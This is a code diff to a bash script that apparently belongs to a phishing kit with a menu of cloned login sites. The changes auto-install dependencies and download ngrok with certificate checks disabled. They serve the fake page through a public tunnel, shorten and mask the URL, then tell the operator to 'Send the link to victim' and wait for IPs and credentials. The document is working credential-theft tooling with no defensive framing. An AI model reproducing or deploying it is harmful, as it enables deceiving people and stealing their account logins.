@@ -6,13 +6,97 @@
 trap 'printf "\n";stop;exit 1' 2
 
 
-dependencies() {
+reqs() {
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
-command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Installing packages..\e[0m\n"
+command -v php > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing php\e[0m\n\n"; apt-get install php -y; }
+command -v curl > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing php\e[0m\n\n"; apt-get install curl -y; }
+command -v wget > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing wget\e[0m\n\n"; apt-get install wget -y; }
+command -v unzip > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing unzip\e[0m\n\n"; apt-get install zip unzip -y; }
+
+if [[ -d .htr ]]; then
+printf ""
+else
+mkdir .htr
+fi
+
+if [[ -e Modules.zip ]]; then
+unzip -qq Modules.zip
+rm Modules.zip
+fi
+
+if [[ -e .htr/ngrok ]]; then
+printf ""
+else
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok..\e[0m\n"
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+mv -f ngrok .htr > /dev/null 2>&1
+rm -rf ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x .htr/ngrok > /dev/null 2>&1
+else
+printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
+exit 1
+fi
+else
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok..\e[0m\n"
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+mv -f ngrok .htr > /dev/null 2>&1
+rm -rf ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x .htr/ngrok > /dev/null 2>&1
+else
+printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
+exit 1
+fi
+fi
+fi
+
+if [[ -e .htr/ngrok2 ]]; then
+printf ""
+else
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok Patch..\e[0m\n"
+wget --no-check-certificate https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip > /dev/null 2>&1
+if [[ -e ngrok-2.2.8-linux-arm64.zip ]]; then
+unzip ngrok-2.2.8-linux-arm64.zip > /dev/null 2>&1
+mv -f ngrok .htr/ngrok2  > /dev/null 2>&1
+rm -rf ngrok-2.2.8-linux-arm64.zip  > /dev/null 2>&1
+chmod +x .htr/ngrok2  > /dev/null 2>&1
+else
+printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
+exit 1
+fi
+else
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok Patch..\e[0m\n"
+wget --no-check-certificate https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-2.2.8-linux-386.zip ]]; then
+unzip ngrok-2.2.8-linux-386.zip > /dev/null 2>&1
+mv -f ngrok .htr/ngrok2
+rm -rf ngrok-2.2.8-linux-386.zip
+chmod +x .htr/ngrok2
+else
+printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
+exit 1
+fi
+fi
+fi
+
+if [[ -d .htr/www ]]; then
+rm -rf .htr/www
+mkdir .htr/www
+else
+mkdir .htr/www
+fi
 
 }
-
 menu() {
 
 printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m VK coin\e[0m\n"
@@ -353,37 +437,33 @@ rm -rf sites/$server/usernames.txt
 fi
 
 
-
-if [[ -e ngrok ]]; then
-echo ""
+if [[ -e .htr/ngrok ]]; then
+printf ""
 else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok..\e[0m\n"
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
+mv -f ngrok .htr > /dev/null 2>&1
+rm -rf ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x .htr/ngrok > /dev/null 2>&1
 else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
 exit 1
 fi
-
-
-
 else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok..\e[0m\n"
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
+mv -f ngrok .htr > /dev/null 2>&1
+rm -rf ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x .htr/ngrok > /dev/null 2>&1
 else
-printf "\e[1;93m[!] Download error... \e[0m\n"
+printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
 exit 1
 fi
 fi
@@ -402,30 +482,61 @@ checkfound
 }
 
 start1() {
-if [[ -e sendlink ]]; then
-rm -rf sendlink
-fi
-
-
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
-option_server="${option_server:-${default_option_server}}"
-if [[ $option_server == 1 || $option_server == 01 ]]; then
-startx
-
-elif [[ $option_server == 2 || $option_server == 02 ]]; then
-start
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
 sleep 1
-clear
-start1
-fi
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..Turn on Hotspot..\e[0m\n"
+cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+sleep 2
+./.htr/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
+
+sleep 5
+ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+validate $ngrok_link
+linker=$(curl -s https://da.gd/s/?url=${ngrok_link})
+validate $linker
+linker2=${linker#https://}
+sleep 3
+banner
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $mask@$linker2
+datafound
 
 }
-checkfound() {
+
+start_ngrok2() {
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
+sleep 1
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok Patched ...\e[0m\n"
+cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+sleep 2
+./.htr/ngrok2 http 127.0.0.1:5555 > /dev/null 2>&1 &
+sleep 5
+ngrok_link2=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+validate $ngrok_link2
+linker1=$(curl -s https://da.gd/s/?url=${ngrok_link2})
+validate $linker1
+linker21=${linker1#https://}
+sleep 3
+banner
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $mask@$linker21
+datafound
+
+}
+validate() {
+    if [ ! "${1//:*}" = http ]; then
+        if [ ! "${1//:*}" = https ]; then
+            printf "\n\e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m  Ngrok was unable to Generate Link.. Try Again..\e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\n\n"
+            exit 1
+        fi
+    fi
+}
+datafound() {
 
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting IPs and Credentials,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
@@ -450,6 +561,6 @@ done
 
 }
 banner
-dependencies
+reqs
 menu
 
